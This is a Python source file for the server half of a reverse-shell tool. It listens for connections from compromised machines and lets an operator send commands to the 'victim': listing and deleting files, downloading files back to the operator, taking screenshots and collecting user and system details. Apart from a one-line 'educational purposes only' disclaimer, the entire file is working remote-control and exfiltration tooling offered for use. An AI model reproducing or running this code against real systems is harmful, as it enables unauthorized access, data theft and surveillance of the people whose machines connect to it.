
try:
    from socket import *
    import os
    import time
    from colorama import Back, Style, Fore
    from getpass import getuser
    import requests
    import re
    import webbrowser as WB
except ImportError as missing_module:
    print(f"[*] Error while importing modules : {missing_module}")

all_current_connections = []
all_current_address = []

class reverseShell:
    def __init__(self):
        self.raw_content = "https://raw.githubusercontent.com/zaqoQLF/reverse-shell/main/src/reverse-shell/server.py"
        self.current_version = "0.0.2"
        self.github_page = "https://www.github.com/zaqoQLF"
        self.IP_HOST = ""
        self.PORT_HOST = ""
        self.ALL_CMD_COMMAND = [
            'dir',
            'ipconfig',
            'date',
            'hostname',
            'title',
            'echo',
            'getmac',
            'systeminfo',
            'del',
            'erase',
            'mdkir',
            'move',
            'rename',
            'replace',
            'rd',
            'tree',
            'rmdir'
        ]

    def Initialize(self):
        os.system('cls')
        time.sleep(1)
        print(
            f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Retreiving version informations... (may takes some time) ")
        time.sleep(2)
        shell.check_raw()

    def check_raw(self):
        try:
            __data__ = requests.get(f"{self.raw_content}")
            raw_version = str(re.findall(
                'self.current_version = "(.*)"', __data__.text)[0])
            if raw_version != self.current_version:
                shell.update_package(raw_version)
            else:
                shell.none_update()
        except Exception as update_err:
            print(
                f"[{Fore.RED}*{Style.RESET_ALL}] An error occured while checking for updates {update_err}")

    def none_update(self):
        print(
            f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Checking for library resources...")
        time.sleep(2)
        shell.shell_local()

    def update_package(self, raw_version):
        while True:
            os.system('cls')
            print(
                f"\n[{Fore.RED}*{Style.RESET_ALL}] Please update the latest version of {Fore.GREEN}Reverse-Shell{Style.RESET_ALL}")
            print(f"\nCurrent version : {self.current_version}")
            print(f"Latest version : {raw_version}")
            update_request_input = input(
                f"\n{Fore.GREEN}zqsh{Style.RESET_ALL} > Do you want to get redirected to the github page ? y/n ")
            if update_request_input == 'y':
                print(
                    f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Redirecting to {Fore.GREEN}https://www.github.com/zaqoQLF{Style.RESET_ALL}")
                time.sleep(2)
                WB.open_new(f'{self.github_page}')
                break
            elif update_request_input == 'n':
                print(f"\n[{Fore.RED}*{Style.RESET_ALL}] Stopping Progam...\n")
                time.sleep(2)
                break
            else:
                print(f"\n[{Fore.RED}X{Style.RESET_ALL}] Invalid Command")
                time.sleep(2)
                continue
    def shell_local(self):
        os.system('cls')
        print(f"""
            
            ╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦  
            ╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣───╚═╗╠═╣║╣ ║  ║  
            ╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝
                       Author: @zaqoQLF

     {Fore.RED}Please use this program for educational purposes only{Style.RESET_ALL}
        """)
        print(f"""\n
                           [{Fore.GREEN}1{Style.RESET_ALL}]\r
                      Local IP Server\n\n
                           [{Fore.GREEN}2{Style.RESET_ALL}]\r 
              Custom IP Address & Port Number 
        """)
        while True:
            local_input = input(f"\n\n{Fore.GREEN}zqsh{Style.RESET_ALL} > ")
            if local_input == '1':
                os.system('cls')
                shell.shell_config_localhost()
                break
            elif local_input == '2':
                os.system('cls')
                shell.shell_setup()
                break

    def shell_config_localhost(self):
        while True:
            os.system('cls')
            self.IP_HOST = "127.0.0.1"
            self.PORT_HOST = 5050
            print(
                f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Configuration Local Host Testing")
            print(
                f"{Fore.RED}Reminder, this is a testing server (local){Style.RESET_ALL}")
            time.sleep(2)
            print(
                f"\nUse these informations on the {Fore.YELLOW}client.py{Style.RESET_ALL} file.")
            print(f"\nIP Server : {Fore.GREEN}{self.IP_HOST}{Style.RESET_ALL}")
            print(
                f"PORT Number : {Fore.GREEN}{self.PORT_HOST}{Style.RESET_ALL}")
            print(
                f'\n[{Fore.GREEN}*{Style.RESET_ALL}] Type "-start" to proceed\n')
            proceed_accept = input(f"{Fore.GREEN}zqsh{Style.RESET_ALL} > ")
            if proceed_accept[:6] == "-start":
                os.system('cls')
                shell.reverse_shell_exc()
                break
            else:
                print(f"\n[{Fore.RED}*{Style.RESET_ALL}] An error occurred")
                time.sleep(2)
                continue

    def shell_setup(self):
        os.system('cls')
        print(
            f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Configuration Custom Server (IP/PORT)")
        IP_SERVER = str(input(
            f"\n{Fore.GREEN}zqsh{Style.RESET_ALL} > Please enter your server IP Address : "))
        PORT_NUMBER = int(
            input(f"\n{Fore.GREEN}zqsh{Style.RESET_ALL} > Please enter your server PORT : "))
        while True:
            os.system('cls')
            print(
                f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Configuration Custom Server (IP/PORT)")
            print(
                f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Server IP Address : {Fore.YELLOW}{IP_SERVER}{Style.RESET_ALL}")
            print(
                f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Server PORT : {Fore.YELLOW}{PORT_NUMBER}{Style.RESET_ALL}")
            valid_input = input(
                f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Do you want to proceed with these informations ? y/n ")
            if valid_input == 'y':
                os.system('cls')
                self.IP_HOST = IP_SERVER
                self.PORT_HOST = PORT_NUMBER
                print(
                    f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Processing to server...")
                time.sleep(2)
                try:
                    shell.reverse_shell_exc()
                    break
                except:
                    print(f"\n[{Fore.RED}*{Style.RESET_ALL}] An error occured")
                    time.sleep(2)
                    continue
            elif valid_input == 'n':
                shell.shell_setup()
                break

    def reverse_shell_exc(self):
        os.system('cls')
        print(
            f"\n{Fore.YELLOW}zqsh{Style.RESET_ALL} > [{Fore.YELLOW}+{Style.RESET_ALL}] Connecting to {Back.YELLOW} {self.IP_HOST} {Style.RESET_ALL} - {Back.YELLOW} {self.PORT_HOST} {Style.RESET_ALL}\n")
        time.sleep(2)
        try:
            data_connect = socket(AF_INET, SOCK_STREAM)
            data_connect.bind((self.IP_HOST, self.PORT_HOST))
            data_connect.listen(10)
            os.system('cls')
            print(
                f"\n\n{Fore.GREEN}zqsh{Style.RESET_ALL} > [{Fore.GREEN}+{Style.RESET_ALL}] Connected to {Back.GREEN} {self.IP_HOST} {Style.RESET_ALL} - {Back.GREEN} {self.PORT_HOST} {Style.RESET_ALL}\n")
            print(
                f"{Fore.GREEN}zqsh{Style.RESET_ALL} > [{Fore.GREEN}*{Style.RESET_ALL}] Server is listening, waiting for incoming requests...")
            shell.accept_socket_entry_conn(data_connect)
        except:
            print(
                f"\n[{Fore.RED}*{Style.RESET_ALL}] An error occured with socket binding")
            print(
                f"\n[{Fore.RED}*{Style.RESET_ALL}] ({Fore.RED}Verify your server IP address and port{Style.RESET_ALL})")
            print(f"\n[{Fore.RED}*{Style.RESET_ALL}] Retrying in 5 seconds...")
            time.sleep(5)
            shell.reverse_shell_exc()

    def accept_socket_entry_conn(self, data_connect):

        client, addr = data_connect.accept()

        all_current_connections.append(client)
        all_current_address.append(addr)
        os.system('cls')
        print(
            f"\n{Fore.YELLOW}zqsh{Style.RESET_ALL} > [{Fore.YELLOW}*{Style.RESET_ALL}] Connection request by {Back.YELLOW } {str(addr[0])} {Style.RESET_ALL} - {Back.YELLOW} {str(addr[1])} {Style.RESET_ALL}\n")
        print("--help for more informations\n")
        shell.switch_con(client, addr, data_connect)

    def switch_con(self, client, addr, data_connect):
        while True:
            connection_switch = input(f"{Fore.GREEN}zqsh{Style.RESET_ALL} > ")
            if connection_switch == '--connect ' + addr[0]:
                print(
                    f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Establishing connection with{Fore.GREEN}{connection_switch[9:]} {Style.RESET_ALL}...")
                try:
                    shell.established_connection_socket(
                        client, addr, data_connect)
                except:
                    print(
                        f"[{Fore.RED}X{Style.RESET_ALL}] The IP that you are trying to connect has been disconnected (--listen to receive request)")
                    continue
                break
            elif connection_switch == '--help':
                print(f"""\n [{Fore.GREEN}*{Style.RESET_ALL}] All Commands Information\n\n USAGE : --listen\n Close all current connection then listen for new connection request\n\n
USAGE: --connect [IP]\n Establish the connection between you and the target (IP: Requested IP)\n\n USAGE: exit -f\n Force exit the reverse shell program\n\n
USAGE: view -r\n View current connection request\n\n
USAGE: credits\n View project & author's credit\n\n
USAGE: --setup\n Change IP Server & Port\n\n
USAGE: clear\n Clear your terminal\n\n
USAGE: --param -all\n View the current IP Server & Port\n\n
USAGE: --param -ip\n View IP Server (Set for the server.py reverse shell)\n\n
USAGE: --param -p\n View Port (Set for the server.py reverse shell)\n\n
                 """)
            elif connection_switch[:8] == '--listen':
                print("Listening...\n")
                data_connect.close()
                shell.shell_setup()
                break
            elif connection_switch[:5] == 'clear':
                os.system('cls')
            # Force exit the python script
            elif connection_switch == 'exit -f':
                print(f"\n[{Fore.RED}*{Style.RESET_ALL}] Ending Connection...\n")
                data_connect.close()
                break
            # View last requests
            elif connection_switch == 'view -r':
                print("\nLast connection request")
                print(
                    f"\n[{Fore.GREEN}*{Style.RESET_ALL}] {str(addr[0])} - {str(addr[1])}\n")
            # Credits of this project ;)
            elif connection_switch[:7] == 'credits':
                print(
                    f"\n[{Fore.GREEN}*{Style.RESET_ALL}] Python Reverse-Shell Credits")
                print(f"\nAuthor : {Fore.GREEN}@zaqoQLF{Style.RESET_ALL}")
                print(f"\nGithub : https://www.github.com/zaqoQLF")
                print(f"\nIf your like this project put a star on it !\n")
            elif connection_switch[:7] == '--setup':
                print(f"\n[{Fore.RED}*{Style.RESET_ALL}] Ending connection...")
                time.sleep(2)
                shell.shell_setup()
                break
            elif connection_switch == '--param --all':
                print(f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Current Settings :")
                print(
                    f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Server IP : {Back.GREEN} {str(addr[0])} {Style.RESET_ALL}")
                print(
                    f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Server PORT : {Back.GREEN} {str(addr[1])} {Style.RESET_ALL}")
                print(f"\nIf you wish to change one of them (--setup)\n")

            elif connection_switch == '--param -p':
                print(f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Current Settings :")
                print(
                    f"\n[{Fore.YELLOW}*{Style.RESET_ALL}] Server PORT : {Back.GREEN} {str(addr[1])} {Style.RESET_ALL}")
                print(f"\nIf you wish to change one of them (--setup)\n")
            else:
                print(
                    f"\n[{Fore.RED}X{Style.RESET_ALL}] This command is not available (--help for more information)\n")
                time.sleep(1)
                continue

    def established_connection_socket(self, client, addr, data_connect):
        time.sleep(1)
        print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Connection has been established : - {Back.GREEN} {str(addr[0])} {Style.RESET_ALL} - {Back.GREEN} {str(addr[1])} {Style.RESET_ALL}")
        while True:
            recever = client.recv(1024).decode()
            print(f"\n" + recever + "\n")

            recever_command = input(
                f"{Fore.YELLOW}zqsh{Style.RESET_ALL}:{Fore.GREEN}{str(addr[0])}{Style.RESET_ALL} > ")
            if recever_command == "exit":
                client.send(recever_command.encode())
                print(f"\n" + recever + "\n")
                exit()
            elif recever_command == 'clear':
                os.system('cls')
                client.send(recever_command.encode())
            elif recever_command == "disconnect":
                print("Disconnecting...")
                time.sleep(2)
                shell.switch_con(client, addr, data_connect)
                break
            elif recever_command == "active":
                print(all_current_address[0])
                client.send(recever_command.encode())
            elif "mkdir" in recever_command:
                client.send(recever_command.encode())
            elif "del" in recever_command:
                client.send(recever_command.encode())
            elif recever_command == 'cls':
                os.system('cls')
                client.send(recever_command.encode())
            elif recever_command[:7] == "down -f":
                client.send(recever_command.encode())
                data = b""
                while True:
                    end_data = client.recv(1024)
                    if end_data == b"Downloaded":
                        break
                    data += end_data
                file_name = input(
                    f"{Fore.GREEN}zqsh{Style.RESET_ALL} >> Output file name :  ")
                new_file = open(file_name, "wb")
                new_file.write(data)
                new_file.close()
                client.send(recever_command.encode())

            elif recever_command == "screenshot":
                client.send(recever_command.encode())

            elif recever_command == '--help':
                print(f"""
[{Fore.GREEN}*{Style.RESET_ALL}] {Fore.GREEN}ALL COMMANDS AVAILABLE {Style.RESET_ALL}
USAGE : {Fore.RED}get_user -name{Style.RESET_ALL}
Get the node name of the victim\n
USAGE : {Fore.RED}get_user --all{Style.RESET_ALL}
Get all informations on the user (System, Machine, Node name...)\n
USAGE : {Fore.RED}active -session{Style.RESET_ALL}
Get all active sessions on the reverse shell\n
USAGE : {Fore.RED}exit{Style.RESET_ALL}
End the connection\n
USAGE : {Fore.RED}dir{Style.RESET_ALL}
List directory of the victim\n
USAGE : {Fore.RED}cd | cd / | cd ..{Style.RESET_ALL}
All CD commands available
""")
                client.send(recever_command.encode())
            else:
                client.send(recever_command.encode())


shell = reverseShell()
if __name__ == "__main__":
    shell.Initialize()
